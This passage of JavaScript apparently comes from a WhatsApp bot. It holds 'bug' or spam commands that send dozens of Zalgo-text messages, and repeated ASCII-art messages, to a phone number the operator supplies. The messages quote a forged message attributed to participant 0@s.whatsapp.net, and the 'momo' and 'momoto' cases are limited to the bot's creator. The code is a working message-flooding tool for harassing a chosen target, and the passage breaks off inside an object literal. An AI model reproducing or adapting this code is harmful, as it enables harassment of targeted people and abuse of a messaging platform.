            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            break
          case 'momo': {            
          if (!isCreator) return
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            }
            break
          case 'momoto': { 
          if (!isCreator) return
          if (!text) throw `Nomernya mana?` 
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
